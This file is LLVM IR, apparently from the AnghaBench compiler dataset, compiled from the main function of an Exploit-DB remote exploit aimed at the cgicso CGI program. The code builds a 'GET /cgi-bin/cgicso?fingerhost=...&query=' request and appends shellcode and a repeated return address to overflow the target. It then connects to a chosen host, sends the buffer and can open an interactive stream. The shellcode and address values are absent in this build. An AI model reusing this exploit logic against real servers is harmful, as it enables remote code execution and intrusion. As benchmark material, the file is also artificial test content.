; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_21998.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_21998.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i64 }
%struct.sockaddr_in = type { i32, i32, %struct.TYPE_2__ }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@RET = common dso_local global i64 0, align 8
@code = common dso_local global i8* null, align 8
@noncode = common dso_local global i8* null, align 8
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [37 x i8] c"usage: %s <host> [offset [--debug]]\0A\00", align 1
@.str.1 = private unnamed_addr constant [8 x i8] c"--debug\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c"-d\00", align 1
@.str.3 = private unnamed_addr constant [22 x i8] c"Using Address: 0x%lx\0A\00", align 1
@LEN = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [3 x i8] c"\0A\0A\00", align 1
@.str.5 = private unnamed_addr constant [18 x i8] c"Using length: %d\0A\00", align 1
@.str.6 = private unnamed_addr constant [20 x i8] c"Connection Failed.\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@PORT = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [20 x i8] c"Connection failed.\0A\00", align 1
@.str.8 = private unnamed_addr constant [7 x i8] c"done.\0A\00", align 1
@.str.9 = private unnamed_addr constant [19 x i8] c"Sending buffer... \00", align 1
@.str.10 = private unnamed_addr constant [25 x i8] c"Entering Debug Mode... \0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i64*, align 8
  %9 = alloca i64, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.hostent*, align 8
  %15 = alloca %struct.sockaddr_in, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %16 = load i64, i64* @RET, align 8
  store i64 %16, i64* %9, align 8
  %17 = load i8*, i8** @code, align 8
  %18 = call i32 @strlen(i8* %17)
  %19 = load i8*, i8** @noncode, align 8
  %20 = call i32 @strlen(i8* %19)
  %21 = sub nsw i32 %18, %20
  store i32 %21, i32* %11, align 4
  store i32 0, i32* %13, align 4
  %22 = load i32, i32* %4, align 4
  %23 = icmp slt i32 %22, 2
  br i1 %23, label %24, label %31

24:                                               ; preds = %2
  %25 = load i32, i32* @stderr, align 4
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 0
  %28 = load i8*, i8** %27, align 8
  %29 = call i32 (i32, i8*, ...) @fprintf(i32 %25, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str, i64 0, i64 0), i8* %28)
  %30 = call i32 @exit(i32 -1) #3
  unreachable

31:                                               ; preds = %2
  %32 = load i32, i32* %4, align 4
  %33 = icmp sgt i32 %32, 2
  br i1 %33, label %34, label %41

34:                                               ; preds = %31
  %35 = load i8**, i8*** %5, align 8
  %36 = getelementptr inbounds i8*, i8** %35, i64 2
  %37 = load i8*, i8** %36, align 8
  %38 = call i64 @atoi(i8* %37)
  %39 = load i64, i64* %9, align 8
  %40 = sub nsw i64 %39, %38
  store i64 %40, i64* %9, align 8
  br label %41

41:                                               ; preds = %34, %31
  %42 = load i32, i32* %4, align 4
  %43 = icmp sgt i32 %42, 3
  br i1 %43, label %44, label %58

44:                                               ; preds = %41
  %45 = load i8**, i8*** %5, align 8
  %46 = getelementptr inbounds i8*, i8** %45, i64 3
  %47 = load i8*, i8** %46, align 8
  %48 = call i32 @strcmp(i8* %47, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0))
  %49 = icmp ne i32 %48, 0
  br i1 %49, label %50, label %56

50:                                               ; preds = %44
  %51 = load i8**, i8*** %5, align 8
  %52 = getelementptr inbounds i8*, i8** %51, i64 3
  %53 = load i8*, i8** %52, align 8
  %54 = call i32 @strcmp(i8* %53, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0))
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %57, label %56

56:                                               ; preds = %50, %44
  store i32 1, i32* %13, align 4
  br label %57

57:                                               ; preds = %56, %50
  br label %58

58:                                               ; preds = %57, %41
  %59 = load i32, i32* @stderr, align 4
  %60 = load i64, i64* %9, align 8
  %61 = call i32 (i32, i8*, ...) @fprintf(i32 %59, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.3, i64 0, i64 0), i64 %60)
  %62 = load i32, i32* @LEN, align 4
  %63 = add nsw i32 44, %62
  %64 = load i32, i32* %11, align 4
  %65 = add nsw i32 %63, %64
  %66 = add nsw i32 %65, 1
  %67 = call i64 @malloc(i32 %66)
  %68 = inttoptr i64 %67 to i8*
  store i8* %68, i8** %6, align 8
  %69 = load i8*, i8** %6, align 8
  store i8* %69, i8** %7, align 8
  %70 = load i8*, i8** %7, align 8
  %71 = getelementptr inbounds i8, i8* %70, i32 1
  store i8* %71, i8** %7, align 8
  store i8 71, i8* %70, align 1
  %72 = load i8*, i8** %7, align 8
  %73 = getelementptr inbounds i8, i8* %72, i32 1
  store i8* %73, i8** %7, align 8
  store i8 69, i8* %72, align 1
  %74 = load i8*, i8** %7, align 8
  %75 = getelementptr inbounds i8, i8* %74, i32 1
  store i8* %75, i8** %7, align 8
  store i8 84, i8* %74, align 1
  %76 = load i8*, i8** %7, align 8
  %77 = getelementptr inbounds i8, i8* %76, i32 1
  store i8* %77, i8** %7, align 8
  store i8 32, i8* %76, align 1
  %78 = load i8*, i8** %7, align 8
  %79 = getelementptr inbounds i8, i8* %78, i32 1
  store i8* %79, i8** %7, align 8
  store i8 47, i8* %78, align 1
  %80 = load i8*, i8** %7, align 8
  %81 = getelementptr inbounds i8, i8* %80, i32 1
  store i8* %81, i8** %7, align 8
  store i8 99, i8* %80, align 1
  %82 = load i8*, i8** %7, align 8
  %83 = getelementptr inbounds i8, i8* %82, i32 1
  store i8* %83, i8** %7, align 8
  store i8 103, i8* %82, align 1
  %84 = load i8*, i8** %7, align 8
  %85 = getelementptr inbounds i8, i8* %84, i32 1
  store i8* %85, i8** %7, align 8
  store i8 105, i8* %84, align 1
  %86 = load i8*, i8** %7, align 8
  %87 = getelementptr inbounds i8, i8* %86, i32 1
  store i8* %87, i8** %7, align 8
  store i8 45, i8* %86, align 1
  %88 = load i8*, i8** %7, align 8
  %89 = getelementptr inbounds i8, i8* %88, i32 1
  store i8* %89, i8** %7, align 8
  store i8 98, i8* %88, align 1
  %90 = load i8*, i8** %7, align 8
  %91 = getelementptr inbounds i8, i8* %90, i32 1
  store i8* %91, i8** %7, align 8
  store i8 105, i8* %90, align 1
  %92 = load i8*, i8** %7, align 8
  %93 = getelementptr inbounds i8, i8* %92, i32 1
  store i8* %93, i8** %7, align 8
  store i8 110, i8* %92, align 1
  %94 = load i8*, i8** %7, align 8
  %95 = getelementptr inbounds i8, i8* %94, i32 1
  store i8* %95, i8** %7, align 8
  store i8 47, i8* %94, align 1
  %96 = load i8*, i8** %7, align 8
  %97 = getelementptr inbounds i8, i8* %96, i32 1
  store i8* %97, i8** %7, align 8
  store i8 99, i8* %96, align 1
  %98 = load i8*, i8** %7, align 8
  %99 = getelementptr inbounds i8, i8* %98, i32 1
  store i8* %99, i8** %7, align 8
  store i8 103, i8* %98, align 1
  %100 = load i8*, i8** %7, align 8
  %101 = getelementptr inbounds i8, i8* %100, i32 1
  store i8* %101, i8** %7, align 8
  store i8 105, i8* %100, align 1
  %102 = load i8*, i8** %7, align 8
  %103 = getelementptr inbounds i8, i8* %102, i32 1
  store i8* %103, i8** %7, align 8
  store i8 99, i8* %102, align 1
  %104 = load i8*, i8** %7, align 8
  %105 = getelementptr inbounds i8, i8* %104, i32 1
  store i8* %105, i8** %7, align 8
  store i8 115, i8* %104, align 1
  %106 = load i8*, i8** %7, align 8
  %107 = getelementptr inbounds i8, i8* %106, i32 1
  store i8* %107, i8** %7, align 8
  store i8 111, i8* %106, align 1
  %108 = load i8*, i8** %7, align 8
  %109 = getelementptr inbounds i8, i8* %108, i32 1
  store i8* %109, i8** %7, align 8
  store i8 63, i8* %108, align 1
  %110 = load i8*, i8** %7, align 8
  %111 = getelementptr inbounds i8, i8* %110, i32 1
  store i8* %111, i8** %7, align 8
  store i8 102, i8* %110, align 1
  %112 = load i8*, i8** %7, align 8
  %113 = getelementptr inbounds i8, i8* %112, i32 1
  store i8* %113, i8** %7, align 8
  store i8 105, i8* %112, align 1
  %114 = load i8*, i8** %7, align 8
  %115 = getelementptr inbounds i8, i8* %114, i32 1
  store i8* %115, i8** %7, align 8
  store i8 110, i8* %114, align 1
  %116 = load i8*, i8** %7, align 8
  %117 = getelementptr inbounds i8, i8* %116, i32 1
  store i8* %117, i8** %7, align 8
  store i8 103, i8* %116, align 1
  %118 = load i8*, i8** %7, align 8
  %119 = getelementptr inbounds i8, i8* %118, i32 1
  store i8* %119, i8** %7, align 8
  store i8 101, i8* %118, align 1
  %120 = load i8*, i8** %7, align 8
  %121 = getelementptr inbounds i8, i8* %120, i32 1
  store i8* %121, i8** %7, align 8
  store i8 114, i8* %120, align 1
  %122 = load i8*, i8** %7, align 8
  %123 = getelementptr inbounds i8, i8* %122, i32 1
  store i8* %123, i8** %7, align 8
  store i8 104, i8* %122, align 1
  %124 = load i8*, i8** %7, align 8
  %125 = getelementptr inbounds i8, i8* %124, i32 1
  store i8* %125, i8** %7, align 8
  store i8 111, i8* %124, align 1
  %126 = load i8*, i8** %7, align 8
  %127 = getelementptr inbounds i8, i8* %126, i32 1
  store i8* %127, i8** %7, align 8
  store i8 115, i8* %126, align 1
  %128 = load i8*, i8** %7, align 8
  %129 = getelementptr inbounds i8, i8* %128, i32 1
  store i8* %129, i8** %7, align 8
  store i8 116, i8* %128, align 1
  %130 = load i8*, i8** %7, align 8
  %131 = getelementptr inbounds i8, i8* %130, i32 1
  store i8* %131, i8** %7, align 8
  store i8 61, i8* %130, align 1
  %132 = load i8*, i8** %7, align 8
  %133 = getelementptr inbounds i8, i8* %132, i32 1
  store i8* %133, i8** %7, align 8
  store i8 65, i8* %132, align 1
  %134 = load i8*, i8** %7, align 8
  %135 = getelementptr inbounds i8, i8* %134, i32 1
  store i8* %135, i8** %7, align 8
  store i8 38, i8* %134, align 1
  %136 = load i8*, i8** %7, align 8
  %137 = getelementptr inbounds i8, i8* %136, i32 1
  store i8* %137, i8** %7, align 8
  store i8 113, i8* %136, align 1
  %138 = load i8*, i8** %7, align 8
  %139 = getelementptr inbounds i8, i8* %138, i32 1
  store i8* %139, i8** %7, align 8
  store i8 117, i8* %138, align 1
  %140 = load i8*, i8** %7, align 8
  %141 = getelementptr inbounds i8, i8* %140, i32 1
  store i8* %141, i8** %7, align 8
  store i8 101, i8* %140, align 1
  %142 = load i8*, i8** %7, align 8
  %143 = getelementptr inbounds i8, i8* %142, i32 1
  store i8* %143, i8** %7, align 8
  store i8 114, i8* %142, align 1
  %144 = load i8*, i8** %7, align 8
  %145 = getelementptr inbounds i8, i8* %144, i32 1
  store i8* %145, i8** %7, align 8
  store i8 121, i8* %144, align 1
  %146 = load i8*, i8** %7, align 8
  %147 = getelementptr inbounds i8, i8* %146, i32 1
  store i8* %147, i8** %7, align 8
  store i8 61, i8* %146, align 1
  %148 = load i8*, i8** %7, align 8
  %149 = getelementptr inbounds i8, i8* %148, i32 1
  store i8* %149, i8** %7, align 8
  store i8 65, i8* %148, align 1
  %150 = load i8*, i8** %7, align 8
  %151 = getelementptr inbounds i8, i8* %150, i32 1
  store i8* %151, i8** %7, align 8
  store i8 65, i8* %150, align 1
  %152 = load i8*, i8** %7, align 8
  %153 = getelementptr inbounds i8, i8* %152, i32 1
  store i8* %153, i8** %7, align 8
  store i8 65, i8* %152, align 1
  store i32 0, i32* %10, align 4
  br label %154

154:                                              ; preds = %167, %58
  %155 = load i32, i32* %10, align 4
  %156 = load i8*, i8** @code, align 8
  %157 = call i32 @strlen(i8* %156)
  %158 = icmp slt i32 %155, %157
  br i1 %158, label %159, label %170

159:                                              ; preds = %154
  %160 = load i8*, i8** @code, align 8
  %161 = load i32, i32* %10, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds i8, i8* %160, i64 %162
  %164 = load i8, i8* %163, align 1
  %165 = load i8*, i8** %7, align 8
  %166 = getelementptr inbounds i8, i8* %165, i32 1
  store i8* %166, i8** %7, align 8
  store i8 %164, i8* %165, align 1
  br label %167

167:                                              ; preds = %159
  %168 = load i32, i32* %10, align 4
  %169 = add nsw i32 %168, 1
  store i32 %169, i32* %10, align 4
  br label %154

170:                                              ; preds = %154
  %171 = load i8*, i8** %7, align 8
  %172 = bitcast i8* %171 to i64*
  store i64* %172, i64** %8, align 8
  store i32 0, i32* %10, align 4
  br label %173

173:                                              ; preds = %186, %170
  %174 = load i32, i32* %10, align 4
  %175 = load i32, i32* @LEN, align 4
  %176 = load i8*, i8** @code, align 8
  %177 = call i32 @strlen(i8* %176)
  %178 = sub nsw i32 %175, %177
  %179 = load i32, i32* %11, align 4
  %180 = add nsw i32 %178, %179
  %181 = icmp slt i32 %174, %180
  br i1 %181, label %182, label %189

182:                                              ; preds = %173
  %183 = load i64, i64* %9, align 8
  %184 = load i64*, i64** %8, align 8
  %185 = getelementptr inbounds i64, i64* %184, i32 1
  store i64* %185, i64** %8, align 8
  store i64 %183, i64* %184, align 8
  br label %186

186:                                              ; preds = %182
  %187 = load i32, i32* %10, align 4
  %188 = add nsw i32 %187, 4
  store i32 %188, i32* %10, align 4
  br label %173

189:                                              ; preds = %173
  %190 = load i8*, i8** %6, align 8
  %191 = call i32 @strcat(i8* %190, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0))
  %192 = load i32, i32* @stderr, align 4
  %193 = load i8*, i8** %6, align 8
  %194 = call i32 @strlen(i8* %193)
  %195 = call i32 (i32, i8*, ...) @fprintf(i32 %192, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.5, i64 0, i64 0), i32 %194)
  %196 = load i8**, i8*** %5, align 8
  %197 = getelementptr inbounds i8*, i8** %196, i64 1
  %198 = load i8*, i8** %197, align 8
  %199 = call i32 @inet_addr(i8* %198)
  %200 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %15, i32 0, i32 2
  %201 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %200, i32 0, i32 0
  store i32 %199, i32* %201, align 4
  %202 = icmp ne i32 %199, 0
  br i1 %202, label %203, label %220

203:                                              ; preds = %189
  %204 = load i8**, i8*** %5, align 8
  %205 = getelementptr inbounds i8*, i8** %204, i64 1
  %206 = load i8*, i8** %205, align 8
  %207 = call %struct.hostent* @gethostbyname(i8* %206)
  store %struct.hostent* %207, %struct.hostent** %14, align 8
  %208 = icmp ne %struct.hostent* %207, null
  br i1 %208, label %212, label %209

209:                                              ; preds = %203
  %210 = call i32 @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.6, i64 0, i64 0))
  %211 = call i32 @exit(i32 -1) #3
  unreachable

212:                                              ; preds = %203
  %213 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %15, i32 0, i32 2
  %214 = bitcast %struct.TYPE_2__* %213 to i8*
  %215 = load %struct.hostent*, %struct.hostent** %14, align 8
  %216 = getelementptr inbounds %struct.hostent, %struct.hostent* %215, i32 0, i32 0
  %217 = load i64, i64* %216, align 8
  %218 = inttoptr i64 %217 to i8*
  %219 = call i32 @memcpy(i8* %214, i8* %218, i32 4)
  br label %220

220:                                              ; preds = %212, %189
  %221 = load i32, i32* @AF_INET, align 4
  %222 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %15, i32 0, i32 1
  store i32 %221, i32* %222, align 4
  %223 = load i32, i32* @PORT, align 4
  %224 = call i32 @htons(i32 %223)
  %225 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %15, i32 0, i32 0
  store i32 %224, i32* %225, align 4
  %226 = load i32, i32* @AF_INET, align 4
  %227 = load i32, i32* @SOCK_STREAM, align 4
  %228 = call i32 @socket(i32 %226, i32 %227, i32 0)
  store i32 %228, i32* %12, align 4
  %229 = load i32, i32* %12, align 4
  %230 = bitcast %struct.sockaddr_in* %15 to %struct.sockaddr*
  %231 = call i64 @connect(i32 %229, %struct.sockaddr* %230, i32 12)
  %232 = icmp ne i64 %231, 0
  br i1 %232, label %233, label %237

233:                                              ; preds = %220
  %234 = load i32, i32* @stderr, align 4
  %235 = call i32 (i32, i8*, ...) @fprintf(i32 %234, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.7, i64 0, i64 0))
  %236 = call i32 @exit(i32 -1) #3
  unreachable

237:                                              ; preds = %220
  %238 = load i32, i32* @stderr, align 4
  %239 = call i32 (i32, i8*, ...) @fprintf(i32 %238, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.8, i64 0, i64 0))
  %240 = load i32, i32* @stderr, align 4
  %241 = call i32 (i32, i8*, ...) @fprintf(i32 %240, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.9, i64 0, i64 0))
  %242 = load i32, i32* %12, align 4
  %243 = load i8*, i8** %6, align 8
  %244 = load i8*, i8** %6, align 8
  %245 = call i32 @strlen(i8* %244)
  %246 = call i32 @send(i32 %242, i8* %243, i32 %245, i32 0)
  %247 = load i32, i32* @stderr, align 4
  %248 = call i32 (i32, i8*, ...) @fprintf(i32 %247, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.8, i64 0, i64 0))
  %249 = call i32 @sleep(i32 2)
  %250 = load i32, i32* %13, align 4
  %251 = icmp eq i32 %250, 1
  br i1 %251, label %252, label %257

252:                                              ; preds = %237
  %253 = load i32, i32* @stderr, align 4
  %254 = call i32 (i32, i8*, ...) @fprintf(i32 %253, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.10, i64 0, i64 0))
  %255 = load i32, i32* %12, align 4
  %256 = call i32 @initstream(i32 %255)
  br label %257

257:                                              ; preds = %252, %237
  %258 = load i32, i32* %12, align 4
  %259 = call i32 @close(i32 %258)
  %260 = load i8*, i8** %6, align 8
  %261 = call i32 @free(i8* %260)
  %262 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @atoi(i8*) #1

declare dso_local i32 @strcmp(i8*, i8*) #1

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @initstream(i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @free(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
